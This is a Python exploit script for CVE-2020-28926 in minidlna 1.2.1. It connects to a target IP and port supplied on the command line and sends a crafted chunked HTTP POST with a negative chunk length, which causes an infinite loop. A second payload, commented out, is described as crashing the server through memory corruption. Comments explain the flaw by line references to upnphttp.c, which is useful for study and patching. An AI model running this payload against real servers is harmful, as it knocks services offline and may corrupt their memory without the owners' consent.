import socket
from argparse import ArgumentParser

"""
	CVE-2020-28926 
		discovered by the Rootshell Security team
		exploit by lorsanta
	
	Tested on minidlna-1.2.1	
"""

ap = ArgumentParser(description="CVE-2020-28926 exploit by lorsanta")
ap.add_argument("-t", "--target", required=True, help="Target's ip address")
ap.add_argument("-p", "--port", required=True, help="Target's port")

args = vars(ap.parse_args())

target = args["target"]
port = int(args["port"])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target, port))

header = 'POST / HTTP/1.1\r\n' \
'Host: 127.0.0.1:8200\r\n' \
'Connection: keep-alive\r\n' \
'Accept-Encoding: gzip, deflate\r\n' \
'Accept: */*\r\n' \
'User-Agent: python-requests/2.18.4\r\n' \
'Transfer-Encoding: chunked\r\n\r\n'

data1 = '-4\r\n' \
'\r\n'

data2 = '-1\r\n' \
'0\r\n' \
'\r\n'


"""
CVE-2020-28926 can cause either an infinite loop or a memory corruption.
In upnphttp.c:418, 'line' is the pointer to the data we send
and 'h->req_chunklen' is the length of the current chunk.
"""

"""
Sending '-4\r\n' we have in upnphttp.c:433 that h->req_chunklen=-4 and that endptr points to '\r\n'. After upnphttp.c:433 'line' points again to '-4\r\n'.
"""
# cause an infinite loop
client.send((header+data1).encode())

"""
Sending '-1\r\n0\r\n' we have in upnphttp.c:433 that h->req_chunklen=-1 and that endptr points to '\r\n0\r\n'. After upnphttp.c:433 'line' points to \n0\r\n and strtol(line) will return 0. This allows to end up in upnphttp.c:869 where strtol(chunk) will return -1.
"""
# trigger SIGSEGV in memmove()
# client.send((header+data2).encode())

